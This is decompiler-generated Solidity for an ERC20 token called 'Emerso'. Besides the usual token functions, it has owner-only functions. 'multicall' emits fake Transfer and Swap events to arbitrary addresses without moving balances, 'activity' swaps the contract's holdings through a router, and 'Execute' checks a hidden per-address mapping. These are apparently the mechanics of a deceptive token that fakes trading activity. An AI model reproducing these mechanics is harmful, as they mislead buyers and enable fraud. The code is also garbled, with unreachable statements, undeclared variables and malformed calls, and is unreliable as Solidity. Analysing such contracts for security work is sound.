// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

/// @title            Decompiled Contract
/// @author           Jonathan Becker <jonathan@jbecker.dev>
/// @custom:version   heimdall-rs v0.9.0
///
/// @notice           This contract was decompiled using the heimdall-rs decompiler.
///                     It was generated directly by tracing the EVM opcodes from this contract.
///                     As a result, it may not compile or even be valid solidity code.
///                     Despite this, it should be obvious what each function does. Overall
///                     logic should have been preserved throughout decompiling.
///
/// @custom:github    You can find the open-source decompiler here:
///                       https://heimdall.rs

contract DecompiledContract {
    string public constant name = "Emerso";
    uint256 public constant decimals = 18;
    string public constant symbol = "EMERSO";
    
    mapping(bytes32 => bytes32) storage_map_g;
    mapping(bytes32 => bytes32) storage_map_a;
    bytes32 store_e;
    address public owner;
    bytes32 store_b;
    mapping(bytes32 => bytes32) storage_map_h;
    bytes32 store_f;
    uint256 public totalSupply;
    
    event Transfer(address, address, uint256);
    event Approval(address, address, uint256);
    event Swap(address, uint256, uint256, uint256, uint256, address);
    
    /// @custom:selector    0xa9059cbb
    /// @custom:signature   transfer(address arg0, uint256 arg1) public payable returns (bool)
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    /// @param              arg1 ["uint256", "bytes32", "int256"]
    function transfer(address arg0, uint256 arg1) public payable returns (bool) {
        require(address(msg.sender), "ERC20: transfer amount exceeds balance");
        require(address(arg0), "ERC20: transfer amount exceeds balance");
        address var_a = address(msg.sender);
        var_b = 0x04;
        require(!(storage_map_a[var_a] < arg1), "ERC20: transfer amount exceeds balance");
        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        uint256 var_d = (0x20 + (0x04 + var_e)) - (0x04 + var_e);
        var_f = 0x26;
        var_g = this.code[5182:5220];
        require(!(arg1 > storage_map_a[var_a]), "SafeMath: subtraction overflow");
        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_d = 0x20;
        var_f = 0x1e;
        var_h = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;
        var_a = address(msg.sender);
        var_b = 0x04;
        storage_map_a[var_a] = storage_map_a[var_a] - arg1;
        var_a = address(arg0);
        require(!((arg1 + storage_map_a[var_a]) < storage_map_a[var_a]), "SafeMath: addition overflow");
        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_d = 0x20;
        var_f = 0x1b;
        var_h = 0x536166654d6174683a206164646974696f6e206f766572666c6f770000000000;
        var_a = address(arg0);
        var_b = 0x04;
        storage_map_a[var_a] = arg1 + storage_map_a[var_a];
        uint256 var_c = arg1;
        emit Transfer(address(msg.sender), address(arg0), arg1);
        var_c = 0x01;
        return 0x01;
        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_d = (0x20 + (0x04 + var_e)) - (0x04 + var_e);
        var_f = 0x23;
        var_g = this.code[5113:5148];
        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_d = (0x20 + (0x04 + var_e)) - (0x04 + var_e);
        var_f = 0x25;
        var_g = this.code[5220:5257];
    }
    
    /// @custom:selector    0x39509351
    /// @custom:signature   increaseAllowance(address arg0, uint256 arg1) public payable returns (bool)
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    /// @param              arg1 ["uint256", "bytes32", "int256"]
    function increaseAllowance(address arg0, uint256 arg1) public payable returns (bool) {
        address var_a = address(msg.sender);
        var_b = 0x05;
        var_a = address(arg0);
        address var_b = keccak256(var_a);
        require(address(msg.sender), "ERC20: approve to the zero address");
        require(address(arg0), "ERC20: approve to the zero address");
        var_a = address(msg.sender);
        var_b = 0x05;
        var_a = address(arg0);
        var_b = keccak256(var_a);
        storage_map_a[var_a] = storage_map_a[var_a] + arg1;
        uint256 var_c = storage_map_a[var_a] + arg1;
        emit Approval(address(msg.sender), address(arg0), storage_map_a[var_a] + arg1);
        var_c = 0x01;
        return 0x01;
        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        uint256 var_d = (0x20 + (0x04 + var_e)) - (0x04 + var_e);
        var_f = 0x22;
        var_g = this.code[5148:5182];
        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_d = (0x20 + (0x04 + var_e)) - (0x04 + var_e);
        var_f = 0x24;
        var_g = this.code[5257:5293];
    }
    
    /// @custom:selector    0xa457c2d7
    /// @custom:signature   decreaseAllowance(address arg0, uint256 arg1) public payable returns (bool)
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    /// @param              arg1 ["uint256", "bytes32", "int256"]
    function decreaseAllowance(address arg0, uint256 arg1) public payable returns (bool) {
        address var_a = address(msg.sender);
        var_b = 0x05;
        var_a = address(arg0);
        address var_b = keccak256(var_a);
        require(!(storage_map_a[var_a] < arg1), "ERC20: decreased allowance below zero");
        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        uint256 var_d = (0x20 + (0x04 + var_e)) - (0x04 + var_e);
        var_f = 0x25;
        var_g = this.code[5293:5330];
        require(address(msg.sender), "ERC20: approve to the zero address");
        require(address(arg0), "ERC20: approve to the zero address");
        var_a = address(msg.sender);
        var_b = 0x05;
        var_a = address(arg0);
        var_b = keccak256(var_a);
        storage_map_a[var_a] = storage_map_a[var_a] - arg1;
        uint256 var_c = storage_map_a[var_a] - arg1;
        emit Approval(address(msg.sender), address(arg0), storage_map_a[var_a] - arg1);
        var_c = 0x01;
        return 0x01;
        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_d = (0x20 + (0x04 + var_e)) - (0x04 + var_e);
        var_f = 0x22;
        var_g = this.code[5148:5182];
        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_d = (0x20 + (0x04 + var_e)) - (0x04 + var_e);
        var_f = 0x24;
        var_g = this.code[5257:5293];
    }
    
    /// @custom:selector    0x4da71fa9
    /// @custom:signature   getBR(address arg0) public payable returns (uint112)
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    function getBR(address arg0) public payable returns (uint112) {
        var_a = 0x0902f1ac00000000000000000000000000000000000000000000000000000000;
        require(address(store_b / 0x01).code.length);
        (bool success, bytes memory ret0) = address(store_b / 0x01).getReserves(var_b); // staticcall
        require(!ret0.length < 0x60);
        var_a = 0x0dfe168100000000000000000000000000000000000000000000000000000000;
        require(address(store_b).code.length);
        (bool success, bytes memory ret0) = address(store_b).token0(var_b); // staticcall
        require(!ret0.length < 0x20);
        require(address(var_c.length) == (address(arg0)));
        uint112 var_a = uint112(var_d);
        return uint112(var_d);
        var_a = uint112(var_c.length);
        return uint112(var_c.length);
    }
    
    /// @custom:selector    0x23b872dd
    /// @custom:signature   transferFrom(address arg0, address arg1, uint256 arg2) public payable returns (bool)
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    /// @param              arg1 ["address", "uint160", "bytes20", "int160"]
    /// @param              arg2 ["uint256", "bytes32", "int256"]
    function transferFrom(address arg0, address arg1, uint256 arg2) public payable returns (bool) {
        address var_a = address(arg0);
        var_b = 0x05;
        var_a = address(msg.sender);
        address var_b = keccak256(var_a);
        require(storage_map_a[var_a] == 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff, "ERC20: transfer amount exceeds balance");
        require(address(arg0), "ERC20: transfer amount exceeds balance");
        require(address(arg1), "ERC20: transfer amount exceeds balance");
        var_a = address(arg0);
        var_b = 0x04;
        require(!(storage_map_a[var_a] < arg2), "ERC20: transfer amount exceeds balance");
        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        uint256 var_d = (0x20 + (0x04 + var_e)) - (0x04 + var_e);
        var_f = 0x26;
        var_g = this.code[5182:5220];
        require(!(arg2 > storage_map_a[var_a]), "SafeMath: subtraction overflow");
        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_d = 0x20;
        var_f = 0x1e;
        var_h = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;
        var_a = address(arg0);
        var_b = 0x04;
        storage_map_a[var_a] = storage_map_a[var_a] - arg2;
        var_a = address(arg1);
        require(!((arg2 + storage_map_a[var_a]) < storage_map_a[var_a]), "SafeMath: addition overflow");
        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_d = 0x20;
        var_f = 0x1b;
        var_h = 0x536166654d6174683a206164646974696f6e206f766572666c6f770000000000;
        var_a = address(arg1);
        var_b = 0x04;
        storage_map_a[var_a] = arg2 + storage_map_a[var_a];
        uint256 var_c = arg2;
        emit Transfer(address(arg0), address(arg1), arg2);
        var_c = 0x01;
        return 0x01;
        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_d = (0x20 + (0x04 + var_e)) - (0x04 + var_e);
        var_f = 0x23;
        var_g = this.code[5113:5148];
        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_d = (0x20 + (0x04 + var_e)) - (0x04 + var_e);
        var_f = 0x25;
        var_g = this.code[5220:5257];
        require(!(storage_map_a[var_a] < arg2), "ERC20: insufficient allowance");
        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_d = 0x20;
        var_f = 0x1d;
        var_h = 0x45524332303a20696e73756666696369656e7420616c6c6f77616e6365000000;
        require(address(arg0), "ERC20: approve to the zero address");
        require(address(msg.sender), "ERC20: approve to the zero address");
        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_d = (0x20 + (0x04 + var_e)) - (0x04 + var_e);
        var_f = 0x22;
        var_g = this.code[5148:5182];
        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_d = (0x20 + (0x04 + var_e)) - (0x04 + var_e);
        var_f = 0x24;
        var_g = this.code[5257:5293];
    }
    
    /// @custom:selector    0x70a08231
    /// @custom:signature   balanceOf(address arg0) public view returns (uint256)
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    function balanceOf(address arg0) public view returns (uint256) {
        address var_a = address(arg0);
        var_b = 0x04;
        address var_c = storage_map_a[var_a];
        return storage_map_a[var_a];
    }
    
    /// @custom:selector    0xb1e84b0d
    /// @custom:signature   multicall(address arg0, uint256 arg1, uint256 arg2, address[] arg3) public payable returns (bool)
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    /// @param              arg1 ["uint256", "bytes32", "int256"]
    /// @param              arg2 ["uint256", "bytes32", "int256"]
    /// @param              arg3 ["uint256", "bytes32", "int256"]
    function multicall(address arg0, uint256 arg1, uint256 arg2, address[] arg3) public payable returns (bool) {
        require(!arg3 > 0x0100000000);
        uint256 var_a = var_a + (0x20 + (0x20 * (arg3)));
        uint256 var_b = (arg3);
        var_c = msg.data[36:36];
        uint256 var_d = 0;
        require(msg.sender == (address(owner)), "Caller is not the owner");
        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_e = 0x20;
        var_f = 0x17;
        var_g = 0x43616c6c6572206973206e6f7420746865206f776e6572000000000000000000;
        var_d = arg1;
        emit Transfer(address(store_b), address(var_c), arg1);
        var_d = arg1;
        uint256 var_h = 0;
        uint256 var_i = 0;
        uint256 var_j = arg2;
        emit Swap(address(store_e), address(var_c), arg1, 0, 0, arg2);
        var_d = 0xe156b1b600000000000000000000000000000000000000000000000000000000;
        address var_e = address(var_c);
        address var_f = address(store_b);
        uint256 var_g = arg2;
        require(address(arg0).code.length);
        (bool success, bytes memory ret0) = address(arg0).{ value: var_i ether }_Transfer(var_e, var_f, var_g); // call
        require(!ret0.length < 0x20);
        var_d = 0x01;
        return 0x01;
    }
    
    /// @custom:selector    0xdd62ed3e
    /// @custom:signature   allowance(address arg0, address arg1) public view returns (uint256)
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    /// @param              arg1 ["address", "uint160", "bytes20", "int160"]
    function allowance(address arg0, address arg1) public view returns (uint256) {
        address var_a = address(arg0);
        var_b = 0x05;
        var_a = address(arg1);
        address var_b = keccak256(var_a);
        address var_c = storage_map_a[var_a];
        return storage_map_a[var_a];
    }
    
    /// @custom:selector    0xd4fddb25
    /// @custom:signature   activity(address arg0, uint256 arg1) public payable
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    /// @param              arg1 ["uint256", "bytes32", "int256"]
    function activity(address arg0, uint256 arg1) public payable {
        require(msg.sender == (address(owner)), "Caller is not the owner");
        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_b = 0x20;
        var_c = 0x17;
        var_d = 0x43616c6c6572206973206e6f7420746865206f776e6572000000000000000000;
        var_a = 0xad5c464800000000000000000000000000000000000000000000000000000000;
        require(address(store_f).code.length);
        (bool success, bytes memory ret0) = address(store_f).WETH(var_b); // staticcall
        require(!ret0.length < 0x20);
        var_a = 0x0902f1ac00000000000000000000000000000000000000000000000000000000;
        require(address(store_b / 0x01).code.length);
        (bool success, bytes memory ret0) = address(store_b / 0x01).getReserves(var_b); // staticcall
        require(!ret0.length < 0x60);
        var_a = 0x0dfe168100000000000000000000000000000000000000000000000000000000;
        require(address(store_b).code.length);
        (bool success, bytes memory ret0) = address(store_b).token0(var_b); // staticcall
        require(!ret0.length < 0x20);
        require(address(var_e.length) == (address(var_e.length)));
        var_a = 0x02;
        uint256 var_e = var_e + 0x60;
        var_f = msg.data[4:68];
        address var_g = address(this);
        var_h = 0xad5c464800000000000000000000000000000000000000000000000000000000;
        require(address(store_f / 0x01).code.length);
        (bool success, bytes memory ret0) = address(store_f / 0x01).WETH(var_i); // staticcall
        require(!ret0.length < 0x20);
        uint256 var_j = address(var_e.length);
        var_h = 0x02;
        var_e = var_e + 0x60;
        var_f = msg.data[4:68];
        var_k = 0x1f00ca7400000000000000000000000000000000000000000000000000000000;
        uint256 var_l = (arg1 * (uint112(var_m))) / 0x0186a0;
        var_n = 0x40;
        uint256 var_o = var_e.length;
        require(!0 < (var_e.length * 0x20));
        require(address(store_f).code.length);
        (bool success, bytes memory ret0) = address(store_f).Unresolved_1f00ca74(var_l); // staticcall
        var_e = var_e + (uint248(ret0.length + 0x1f));
        require(!ret0.length < 0x20);
        require(!var_e.length > 0x0100000000);
        require(!((var_e + var_e.length) + 0x20) > (var_e + ret0.length));
        require(!(var_p > 0x0100000000) | (((var_e + var_e.length) + 0x20) + (var_p * 0x20) > (var_e + ret0.length)));
        var_q = var_p;
        require(!0 < (0x20 * (var_p)));
        var_e = (0x20 * (var_r)) + (0x20 + var_e);
        require(block.timestamp > 0x01);
        uint256 var_s = 0;
        var_t = 0x04;
        storage_map_g[var_s] = (var_m) + storage_map_g[var_s];
        require(var_e.length);
        var_s = address(this);
        var_t = 0x04;
        require(address(this));
        require(address(store_f));
        var_s = address(this);
        var_t = 0x05;
        var_s = address(store_f);
        uint256 var_t = keccak256(var_s);
        storage_map_g[var_s] = storage_map_g[var_s];
        uint256 var_u = storage_map_g[var_s];
        emit Approval(address(this), address(store_f), storage_map_g[var_s]);
        var_u = 0x8803dbee00000000000000000000000000000000000000000000000000000000;
        var_o = (arg1 * (uint112(var_m))) / 0x0186a0;
        var_v = var_m;
        address var_w = address(arg0);
        uint256 var_x = 0x04b0 + block.timestamp;
        uint256 var_y = (0x20 + (0x20 + (0x20 + (0x20 + (0x20 + (0x04 + var_e)))))) - (0x04 + var_e);
        uint256 var_z = var_e.length;
        require(!0 < (0x20 * var_e.length));
        require(address(store_f / 0x01).code.length);
        (bool success, bytes memory ret0) = address(store_f / 0x01).{ value: 0 ether }Unresolved_8803dbee(var_o); // call
        var_e = var_e + (uint248(ret0.length + 0x1f));
        require(!ret0.length < 0x20);
        require(!var_e.length > 0x0100000000);
        require(!((var_e + var_e.length) + 0x20) > (var_e + ret0.length));
        require(!(var_p > 0x0100000000) | (((var_e + var_e.length) + 0x20) + (var_p * 0x20) > (var_e + ret0.length)));
        var_aa = var_p;
        require(!0 < (0x20 * (var_p)));
        var_e = (0x20 * (var_r)) + (0x20 + var_e);
        var_u = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_o = (0x20 + (0x04 + var_e)) - (0x04 + var_e);
        var_v = 0x22;
        var_ab = this.code[5148:5182];
        var_u = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_o = (0x20 + (0x04 + var_e)) - (0x04 + var_e);
        var_v = 0x24;
        var_ab = this.code[5257:5293];
    }
    
    /// @custom:selector    0xbddfe623
    /// @custom:signature   Execute(uint256 arg0, uint256 arg1, bytes32[] arg2) public view
    /// @param              arg0 ["uint256", "bytes32", "int256"]
    /// @param              arg1 ["uint256", "bytes32", "int256"]
    /// @param              arg2 ["uint256", "bytes32", "int256"]
    function Execute(uint256 arg0, uint256 arg1, bytes32[] arg2) public view {
        require(!arg2 > 0x0100000000);
        require(msg.sender == (address(owner)), "Caller is not the owner");
        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_b = 0x20;
        var_c = 0x17;
        var_d = 0x43616c6c6572206973206e6f7420746865206f776e6572000000000000000000;
        require(!0 < (arg2));
        require(0 < (arg2));
        uint256 var_e = address(((0 + (0x20 + (arg2))) >> 0) >> 0x60);
        var_f = 0x04;
        require(!storage_map_h[var_e] > arg0);
        require(0 < (arg2));
        var_e = address(((0 + (0x20 + (arg2))) >> 0) >> 0x60);
        var_f = 0x04;
        require(arg1);
        require(0 < (arg2));
    }
    
    /// @custom:selector    0x095ea7b3
    /// @custom:signature   approve(address arg0, uint256 arg1) public payable returns (bool)
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    /// @param              arg1 ["uint256", "bytes32", "int256"]
    function approve(address arg0, uint256 arg1) public payable returns (bool) {
        require(address(msg.sender), "ERC20: approve to the zero address");
        require(address(arg0), "ERC20: approve to the zero address");
        address var_a = address(msg.sender);
        var_b = 0x05;
        var_a = address(arg0);
        address var_b = keccak256(var_a);
        storage_map_a[var_a] = arg1;
        uint256 var_c = arg1;
        emit Approval(address(msg.sender), address(arg0), arg1);
        var_c = 0x01;
        return 0x01;
        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        uint256 var_d = (0x20 + (0x04 + var_e)) - (0x04 + var_e);
        var_f = 0x22;
        var_g = this.code[5148:5182];
        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_d = (0x20 + (0x04 + var_e)) - (0x04 + var_e);
        var_f = 0x24;
        var_g = this.code[5257:5293];
    }
}